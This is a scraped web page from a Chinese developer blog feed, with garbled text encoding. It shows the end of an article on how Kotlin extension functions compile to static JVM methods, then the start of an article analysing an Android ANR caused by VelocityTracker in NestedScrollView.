li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>æ‰©å±•æ˜¯æ€ä¹ˆåšåˆ°çš„</p>
</blockquote>
<p>Kotlinæ‰©å±•ï¼ˆExtensionsï¼‰çš„å®ç°åŸç†ä¸»è¦åŸºäº<strong>ç¼–è¯‘æ—¶çš„é™æ€åˆ†æ´¾</strong>å’Œ<strong>è¯­æ³•ç³–</strong>ã€‚</p>
<blockquote>
<p>ä»ç¼–è¯‘åçš„å­—èŠ‚ç å±‚é¢çœ‹</p>
</blockquote>
<p>æ‰©å±•å‡½æ•°è¢«ç¼–è¯‘ä¸ºï¼š</p>
<ul>
<li>é™æ€æ–¹æ³•ï¼ˆstatic methodï¼‰</li>
<li>ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯æ¥æ”¶è€…ç±»å‹ï¼ˆreceiver typeï¼‰</li>
<li>æ–¹æ³•ååŒ…å«æ¥æ”¶è€…ç±»å‹ä¿¡æ¯ï¼ˆé¿å…å†²çªï¼‰</li>
</ul>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// Kotlinä»£ç </span>
fun <span class="hljs-title class_">String</span>.<span class="hljs-title function_">addExclamation</span>(): <span class="hljs-title class_">String</span> {
    <span class="hljs-keyword">return</span> <span class="hljs-string">"$this!"</span>
}

<span class="hljs-comment">// ç¼–è¯‘åç­‰ä»·äºJava</span>
public <span class="hljs-keyword">static</span> <span class="hljs-title class_">String</span> <span class="hljs-title function_">addExclamation</span>(<span class="hljs-params"><span class="hljs-built_in">String</span> receiver</span>) {
    <span class="hljs-keyword">return</span> receiver + <span class="hljs-string">"!"</span>;
}


<span class="hljs-comment">// åç¼–è¯‘åçš„Javaä»£ç ç¤ºä¾‹</span>
public final <span class="hljs-keyword">class</span> <span class="hljs-title class_">StringExtensionsKt</span> {
    public <span class="hljs-keyword">static</span> final <span class="hljs-title class_">String</span> <span class="hljs-title function_">addExclamation</span>(<span class="hljs-params">@NotNull <span class="hljs-built_in">String</span> $this$addExclamation</span>) {
        <span class="hljs-comment">// æ–¹æ³•ä½“</span>
    }
}
</code></pre>
<h3 data-id="heading-0">Â é™åˆ¶å’Œæ³¨æ„äº‹é¡¹</h3>
<ol>
<li><strong>æ²¡æœ‰å¤šæ€æ€§</strong>ï¼šæ‰©å±•æ˜¯é™æ€åˆ†æ´¾çš„</li>
<li><strong>ä¸èƒ½è¦†ç›–æˆå‘˜</strong>ï¼šæ‰©å±•å‡½æ•°ä¸ä¼šè¦†ç›–ç±»çš„æˆå‘˜å‡½æ•°</li>
<li><strong>ä½œç”¨åŸŸé™åˆ¶</strong>ï¼šéœ€è¦å¯¼å…¥æ‰èƒ½ä½¿ç”¨</li>
<li><strong>ä¼˜å…ˆçº§</strong>ï¼šæˆå‘˜å‡½æ•°ä¼˜å…ˆäºæ‰©å±•å‡½æ•°</li>
</ol>
<h3 data-id="heading-1">Kotlinæ‰©å±•çš„æœ¬è´¨æ˜¯ï¼š</h3>
<ul>
<li><strong>è¯­æ³•ç³–</strong>ï¼šæä¾›æ›´å¥½çš„APIè®¾è®¡ä½“éªŒ</li>
<li><strong>é™æ€åˆ†æ´¾</strong>ï¼šç¼–è¯‘æ—¶ç¡®å®šè°ƒç”¨çš„æ–¹æ³•</li>
<li><strong>æ— ä¾µå…¥</strong>ï¼šä¸ä¿®æ”¹åŸæœ‰ç±»çš„å­—èŠ‚ç </li>
<li><strong>ç±»å‹å®‰å…¨</strong>ï¼šç¼–è¯‘å™¨è¿›è¡Œå®Œæ•´çš„ç±»å‹æ£€æŸ¥</li>
</ul>
<p>è¿™ç§è®¾è®¡ä½¿å¾—Kotlinèƒ½å¤Ÿåœ¨ä¸ç ´åç°æœ‰Javaå…¼å®¹æ€§çš„å‰æä¸‹ï¼Œæä¾›çµæ´»çš„APIæ‰©å±•èƒ½åŠ›ã€‚</p>
<h2 data-id="heading-2">ä¸åŒç±»å‹æ‰©å±•å®ç°</h2>
<h4 data-id="heading-3">é¡¶å±‚æ‰©å±•</h4>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// æ–‡ä»¶: StringExtensions.kt</span>
package com.<span class="hljs-property">example</span>

fun <span class="hljs-title class_">String</span>.<span class="hljs-title function_">customExtension</span>(<span class="hljs-params"/>) { ... }

<span class="hljs-comment">// ä½¿ç”¨ï¼šè‡ªåŠ¨å¯¼å…¥</span>
<span class="hljs-string">"hello"</span>.<span class="hljs-title function_">customExtension</span>()
</code></pre>
<h4 data-id="heading-4">æˆå‘˜æ‰©å±•</h4>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Host</span> {
    <span class="hljs-comment">// æ‰©å±•çš„æ¥æ”¶è€…æ˜¯Stringï¼Œä½†å£°æ˜åœ¨Hostå†…éƒ¨</span>
    fun <span class="hljs-title class_">String</span>.<span class="hljs-title function_">doSomething</span>(<span class="hljs-params"/>) {
        <span class="hljs-comment">// å¯ä»¥è®¿é—®Hostçš„æˆå‘˜</span>
    }
}
</code></pre>
<h4 data-id="heading-5">æ‰©å±•ä¼´éšå¯¹è±¡</h4>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">class</span> <span class="hljs-title class_">MyClass</span> {
    companion object
}

fun <span class="hljs-title class_">MyClass</span>.<span class="hljs-property">Companion</span>.<span class="hljs-title function_">extension</span>(<span class="hljs-params"/>) { ... }
</code></pre>
<h2 data-id="heading-6">ç‰¹æ®Šæƒ…å†µçš„å¤„ç†</h2>
<h4 data-id="heading-7">æ‰©å±•ä¸ç»§æ‰¿</h4>
<pre><code class="hljs language-js" lang="js">open <span class="hljs-keyword">class</span> <span class="hljs-title class_">Animal</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">Dog</span> : <span class="hljs-title class_">Animal</span>()

fun <span class="hljs-title class_">Animal</span>.<span class="hljs-title function_">speak</span>() = <span class="hljs-string">"Animal sound"</span>
fun <span class="hljs-title class_">Dog</span>.<span class="hljs-title function_">speak</span>() = <span class="hljs-string">"Bark"</span>

val <span class="hljs-attr">animal</span>: <span class="hljs-title class_">Animal</span> = <span class="hljs-title class_">Dog</span>()
<span class="hljs-title function_">println</span>(animal.<span class="hljs-title function_">speak</span>()) <span class="hljs-comment">// "Animal sound" (é™æ€åˆ†æ´¾)</span>
</code></pre>
<h4 data-id="heading-8">å¯ç©ºæ¥æ”¶è€…</h4>
<pre><code class="hljs language-js" lang="js">fun <span class="hljs-title class_">String</span>?.<span class="hljs-title function_">safeLength</span>(): <span class="hljs-title class_">Int</span> {
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>?.<span class="hljs-property">length</span> ?: <span class="hljs-number">0</span>
}

<span class="hljs-comment">// ç¼–è¯‘ä¸ºå¤„ç†nullçš„é™æ€æ–¹æ³•</span>

</code></pre>
<h4 data-id="heading-9">æ³›å‹æ‰©å±•</h4>
<pre><code class="hljs language-js" lang="js">fun &lt;T&gt; <span class="hljs-title class_">List</span>&lt;T&gt;.<span class="hljs-title function_">customFilter</span>(): <span class="hljs-title class_">List</span>&lt;T&gt; { ... }

<span class="hljs-comment">// ç¼–è¯‘æ—¶è¿›è¡Œç±»å‹æ“¦é™¤ï¼Œä½†ä¿ç•™ç±»å‹å®‰å…¨æ£€æŸ¥</span>
</code></pre>
<h2 data-id="heading-10">æ‰©å±•å±æ€§èƒŒåçš„æœºåˆ¶</h2>
<p>æ‰©å±•å±æ€§<strong>æ²¡æœ‰å¹•åå­—æ®µ</strong>ï¼ˆbacking fieldï¼‰ï¼Œå¿…é¡»æä¾›getterï¼ˆå’Œsetterï¼‰ï¼š</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">var</span> <span class="hljs-title class_">StringBuilder</span>.<span class="hljs-property">lastChar</span>: <span class="hljs-title class_">Char</span>
    <span class="hljs-title function_">get</span>() = <span class="hljs-title function_">get</span>(length - <span class="hljs-number">1</span>)
    <span class="hljs-title function_">set</span>(value) = <span class="hljs-title function_">setCharAt</span>(length - <span class="hljs-number">1</span>, value)

<span class="hljs-comment">// ç¼–è¯‘ä¸ºä¸¤ä¸ªé™æ€æ–¹æ³•ï¼š</span>
<span class="hljs-comment">// getLastChar(StringBuilder)</span>
<span class="hljs-comment">// setLastChar(StringBuilder, Char)</span>
</code></pre>
<h2 data-id="heading-11">ä¸Javaçš„äº’æ“ä½œæ€§</h2>
<h4 data-id="heading-12">ä»Javaè°ƒç”¨Kotlinæ‰©å±•</h4>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// Kotlinæ‰©å±•</span>
fun <span class="hljs-title class_">String</span>.<span class="hljs-title function_">kotlinExtension</span>(): <span class="hljs-title class_">String</span> { ... }

<span class="hljs-comment">// Javaä¸­è°ƒç”¨</span>
<span class="hljs-title class_">String</span> result = <span class="hljs-title class_">ExtensionKt</span>.<span class="hljs-title function_">kotlinExtension</span>(<span class="hljs-string">"hello"</span>);
</code></pre>
<h4 data-id="heading-13">æ‰©å±•çš„JVMæ³¨è§£</h4>
<p>ç¼–è¯‘å™¨å¯ä»¥æ·»åŠ <code>@JvmName</code>æ¥ä¿®æ”¹ç”Ÿæˆçš„Javaæ–¹æ³•åï¼š</p>
<pre><code class="hljs language-js" lang="js">@<span class="hljs-title class_">JvmName</span>(<span class="hljs-string">"addPrefix"</span>)
fun <span class="hljs-title class_">String</span>.<span class="hljs-title function_">prefix</span>() = <span class="hljs-string">"prefix_$this"</span>
</code></pre>
<h2 data-id="heading-14">å®é™…åº”ç”¨ç¤ºä¾‹</h2>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// å®é™…ç¼–è¯‘ç¤ºä¾‹</span>
fun <span class="hljs-title class_">String</span>.<span class="hljs-title function_">repeat</span>(<span class="hljs-attr">n</span>: <span class="hljs-title class_">Int</span>): <span class="hljs-title class_">String</span> {
    val builder = <span class="hljs-title class_">StringBuilder</span>()
    <span class="hljs-title function_">repeat</span>(<span class="hljs-params">n</span>) { builder.<span class="hljs-title function_">append</span>(<span class="hljs-variable language_">this</span>) }
    <span class="hljs-keyword">return</span> builder.<span class="hljs-title function_">toString</span>()
}

<span class="hljs-comment">// ç¼–è¯‘ä¸ºï¼š</span>
public <span class="hljs-keyword">static</span> <span class="hljs-title class_">String</span> <span class="hljs-title function_">repeat</span>(<span class="hljs-params"><span class="hljs-built_in">String</span> receiver, int n</span>) {
    <span class="hljs-title class_">StringBuilder</span> builder = <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>();
    <span class="hljs-keyword">for</span> (int i = <span class="hljs-number">0</span>; i &lt; n; i++) {
        builder.<span class="hljs-title function_">append</span>(receiver);
    }
    <span class="hljs-keyword">return</span> builder.<span class="hljs-title function_">toString</span>();
}
</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ä¸€æ¬¡å¿…ç°ANRé—®é¢˜çš„æ·±åº¦åˆ†æä¸è§£å†³ä¹‹æ—…:å½“NestedScrollViewé‡ä¸ŠVelocityTracker]]></title>    <link>https://juejin.cn/post/7590128405351432192</link>    <guid>https://juejin.cn/post/7590128405351432192</guid>    <pubDate>2026-01-03T02:34:49.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7590128405351432192" data-draft-id="7590128405351415808" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ä¸€æ¬¡å¿…ç°ANRé—®é¢˜çš„æ·±åº¦åˆ†æä¸è§£å†³ä¹‹æ—…:å½“NestedScrollViewé‡ä¸ŠVelocityTracker"/> <meta itemprop="keywords" content="Android,Debug,æ€§èƒ½ä¼˜åŒ–"/> <meta itemprop="datePublished" content="2026-01-03T02:34:49.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å†¬å¥‡Lab"/> <meta itemprop="url" content="https://juejin.cn/user/1857501105781193"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ä¸€æ¬¡å¿…ç°ANRé—®é¢˜çš„æ·±åº¦åˆ†æä¸è§£å†³ä¹‹æ—…:å½“NestedScrollViewé‡ä¸ŠVelocityTracker
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1857501105781193/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å†¬å¥‡Lab
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-03T02:34:49.000Z" title="Sat Jan 03 2026 02:34:49 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-03
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»13åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">ä¸‹ç­å‰æ€»ä¼šæœ‰é—®é¢˜åœ¨ç­‰ä½ </h2>
<p>å‘¨äº”ä¸‹åˆå¿«ä¸‹ç­äº†,æµ‹è¯•åŒå­¦çªç„¶æ‰¾è¿‡æ¥:"è¿™ä¸ªé¡µé¢æ¯æ¬¡ç‚¹å‡»éƒ½ä¼šå¡æ­»,å¿…ç°çš„!"ä½ å¿ƒæƒ³,"å¿…ç°?é‚£è¿˜ä¸ç®€å•,åˆ†åˆ†é’Ÿæå®šã€‚"ç»“æœæ‹¿åˆ°æ—¥å¿—ä¸€çœ‹,å¥½å®¶ä¼™,<strong>ä¸€å°æ—¶å†…è¿ç»­å‘ç”Ÿäº†7æ¬¡ANR</strong>,ä¸»çº¿ç¨‹å±…ç„¶åœ¨CPUä¸Šæ‰§è¡Œäº†è¶…è¿‡7ç§’çš„è®¡ç®—ä»»åŠ¡!</p>
<p>è¿™ä¸æ˜¯æ®µå­,è¿™æ˜¯æˆ‘æœ€è¿‘é‡åˆ°çš„ä¸€ä¸ªçœŸå®æ¡ˆä¾‹ã€‚ä»Šå¤©å°±å’Œå¤§å®¶åˆ†äº«è¿™æ¬¡"æƒŠå¿ƒåŠ¨é­„"çš„ANRæ’æŸ¥ä¹‹æ—…â€”â€”ä»å‘ç°é—®é¢˜åˆ°æ·±åº¦åˆ†æ,å†åˆ°æä¾›å¤šå¥—è§£å†³æ–¹æ¡ˆçš„å®Œæ•´è¿‡ç¨‹ã€‚</p>
<h2 data-id="heading-1">è¿‡ç¨‹é€Ÿè§ˆ</h2>
<ul>
<li><strong>é—®é¢˜</strong>: è½¦è½½è®¾ç½®åº”ç”¨ä¸­,ç‚¹å‡»æ—¥é—´è¡Œè½¦ç¯è®¾ç½®æ—¶å¿…ç°ANR,ä¸»çº¿ç¨‹é˜»å¡è¶…è¿‡7ç§’</li>
<li><strong>æ ¹å› </strong>: <code>NestedScrollView</code> è§¦æ‘¸äº‹ä»¶å¤„ç†æ—¶,<code>VelocityTracker</code> çš„é€Ÿåº¦è®¡ç®—(æœ€å°äºŒä¹˜æ³•)è€—æ—¶å¼‚å¸¸</li>
<li><strong>å½±å“</strong>: P0çº§ä¸¥é‡é—®é¢˜,å¿…ç°,å½±å“ç”¨æˆ·ä½“éªŒ</li>
<li><strong>è§£å†³</strong>: æä¾›4ä¸ªå±‚çº§çš„è§£å†³æ–¹æ¡ˆ,ä»å¿«é€Ÿä¿®å¤åˆ°æ¶æ„ä¼˜åŒ–</li>
<li><strong>æ”¶è·</strong>: æ·±å…¥ç†è§£Androidè§¦æ‘¸äº‹ä»¶å¤„ç†æœºåˆ¶,æŒæ¡ANRæ’æŸ¥æ–¹æ³•è®º</li>
</ul>
<h2 data-id="heading-2">é—®é¢˜ç°åœºè¿˜åŸ</h2>
<h3 data-id="heading-3">æ¡ˆå‘ç°åœº</h3>
<p><strong>æ—¶é—´</strong>: 2025å¹´12æœˆ23æ—¥ 15:25-16:13<br/>
<strong>åœ°ç‚¹</strong>: è½¦è½½è®¾ç½®åº”ç”¨ â†’ è½¦ç¯ â†’ ç¯å¢ƒç¯ â†’ æ—¥é—´è¡Œè½¦ç¯è®¾ç½®<br/>
<strong>æ¡ˆæƒ…</strong>: æ¯æ¬¡ç‚¹å‡»æ—¥é—´è¡Œè½¦ç¯ä¸‹æ–¹çš„æ–‡å­—,åº”ç”¨ç«‹å³å¡æ­»å¹¶é—ªé€€</p>
<p><strong>å…³é”®è¯æ®</strong> (æ¥è‡ªANR traceæ–‡ä»¶):</p>
<pre><code class="hljs language-ini" lang="ini">Subject: Input dispatching timed out
(SMART_POPUP_INTERRUPT_PERM is not responding.
Waited 5000ms for MotionEvent(<span class="hljs-attr">action</span>=UP))

ä¸»çº¿ç¨‹çŠ¶æ€:
- <span class="hljs-attr">state</span>=Native (æ­£åœ¨æ‰§è¡Œnativeä»£ç )
- CPU <span class="hljs-attr">time</span>=<span class="hljs-number">7538472365</span>çº³ç§’ â‰ˆ <span class="hljs-number">7.5</span>ç§’
- ç”¨æˆ·æ€æ—¶é—´:702ä¸ªæ—¶é—´ç‰‡ â‰ˆ 7.02ç§’
</code></pre>
<p>çœ‹åˆ°è¿™é‡Œæˆ‘å°±çº³é—·äº†:ä¸€ä¸ªç®€å•çš„è§¦æ‘¸äº‹ä»¶,å‡­ä»€ä¹ˆè¦æ¶ˆè€—7ç§’çš„CPUæ—¶é—´?</p>
<h3 data-id="heading-4">è¿ç»­ä½œæ¡ˆè®°å½•</h3>
<p>æ›´è®©äººæƒŠè®¶çš„æ˜¯,è¿™ä¸æ˜¯å­¤ç«‹äº‹ä»¶ã€‚ä»Critical Event Logä¸­å‘ç°,è¿™ä¸ªANRåœ¨ä¸€å°æ—¶å†…é‡å¤å‡ºç°äº†7æ¬¡:</p>





















































<table><thead><tr><th>æ—¶é—´</th><th>PID</th><th>æ—¶é—´é—´éš”</th><th>çŠ¶æ€</th></tr></thead><tbody><tr><td>15:25:03</td><td>3292</td><td>-</td><td>é¦–æ¬¡å‡ºç°</td></tr><tr><td>15:49:16</td><td>15858</td><td>24åˆ†13ç§’</td><td>åº”ç”¨é‡å¯</td></tr><tr><td>15:49:52</td><td>16887</td><td>36ç§’</td><td>å¿«é€Ÿå¤ç°</td></tr><tr><td>15:52:31</td><td>16887</td><td>2åˆ†39ç§’</td><td>æŒç»­å‡ºç°</td></tr><tr><td><strong>15:53:18</strong></td><td><strong>17362</strong></td><td><strong>47ç§’</strong></td><td><strong>å½“å‰åˆ†æ</strong></td></tr><tr><td>15:54:10</td><td>?</td><td>52ç§’</td><td>å†æ¬¡å¤ç°</td></tr><tr><td>16:13:27</td><td>?</td><td>19åˆ†17ç§’</td><td>ä»åœ¨å‘ç”Ÿ</td></tr></tbody></table>
<p><strong>ç»“è®º</strong>:è¿™æ˜¯ä¸€ä¸ªç¨³å®šå¤ç°çš„ä»£ç çº§Bug,è€Œä¸æ˜¯å¶å‘çš„ç³»ç»Ÿé—®é¢˜æˆ–ç¡¬ä»¶å¼‚å¸¸ã€‚</p>
<h2 data-id="heading-5">æ·±å…¥åˆ†æ:çœŸç›¸åªæœ‰ä¸€ä¸ª</h2>
<h3 data-id="heading-6">è°ƒç”¨æ ˆè¿½è¸ª</h3>
<p>è®©æˆ‘ä»¬çœ‹çœ‹ä¸»çº¿ç¨‹åœ¨å¹²ä»€ä¹ˆ(å…³é”®éƒ¨åˆ†):</p>
<pre><code class="hljs language-less" lang="less"><span class="hljs-selector-tag">Native</span>å±‚é˜»å¡ç‚¹:
  <span class="hljs-selector-id">#00</span> <span class="hljs-selector-tag">libinput</span><span class="hljs-selector-class">.so</span>: <span class="hljs-selector-tag">LeastSquaresVelocityTrackerStrategy</span>::<span class="hljs-selector-tag">getEstimator</span>+<span class="hljs-number">299</span>
  <span class="hljs-selector-id">#01</span> <span class="hljs-selector-tag">libinput</span><span class="hljs-selector-class">.so</span>: <span class="hljs-selector-tag">VelocityTracker</span>::<span class="hljs-selector-tag">getVelocity</span>+<span class="hljs-number">65</span>
  <span class="hljs-selector-id">#02</span> <span class="hljs-selector-tag">libandroid_runtime</span><span class="hljs-selector-class">.so</span>: <span class="hljs-selector-tag">android_view_VelocityTracker_nativeComputeCurrentVelocity</span>

<span class="hljs-selector-tag">Java</span>å±‚è°ƒç”¨é“¾:
  <span class="hljs-selector-tag">at</span> <span class="hljs-selector-tag">android</span><span class="hljs-selector-class">.view</span><span class="hljs-selector-class">.VelocityTracker</span><span class="hljs-selector-class">.nativeComputeCurrentVelocity</span>(Native)
  <span class="hljs-selector-tag">at</span> <span class="hljs-selector-tag">android</span><span class="hljs-selector-class">.view</span><span class="hljs-selector-class">.VelocityTracker</span><span class="hljs-selector-class">.computeCurrentVelocity</span>(VelocityTracker.<span class="hljs-attribute">java</span>:<span class="hljs-number">354</span>)
  <span class="hljs-selector-tag">at</span> <span class="hljs-selector-tag">androidx</span><span class="hljs-selector-class">.core</span><span class="hljs-selector-class">.widget</span><span class="hljs-selector-class">.NestedScrollView</span><span class="hljs-selector-class">.onTouchEvent</span>(<span class="hljs-attribute">unavailable</span>:<span class="hljs-number">467</span>)
  <span class="hljs-selector-tag">at</span> <span class="hljs-selector-tag">android</span><span class="hljs-selector-class">.view</span><span class="hljs-selector-class">.View</span><span class="hljs-selector-class">.dispatchTouchEvent</span>(View.<span class="hljs-attribute">java</span>:<span class="hljs-number">15010</span>)
  ...
  <span class="hljs-selector-tag">at</span> <span class="hljs-selector-tag">android</span><span class="hljs-selector-class">.app</span><span class="hljs-selector-class">.Dialog</span><span class="hljs-selector-class">.dispatchTouchEvent</span>(Dialog.<span class="hljs-attribute">java</span>:<span class="hljs-number">911</span>)  â† é—®é¢˜å‘ç”Ÿåœ¨<span class="hljs-selector-tag">Dialog</span>ä¸­
</code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c5b5278982954dcba4bb7f23672d66d0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Yas5aWHTGFi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768012488&amp;x-signature=jvQvQkPhMsz2d8q7tyfZQdmmTHc%3D" alt="case4-anr-touch-event-flow.png" loading="lazy"/></p>
<p><em>å›¾1: ANRè§¦æ‘¸äº‹ä»¶å¤„ç†å®Œæ•´æµç¨‹</em></p>
<h3 data-id="heading-7">ç½ªé­ç¥¸é¦–:VelocityTracker</h3>
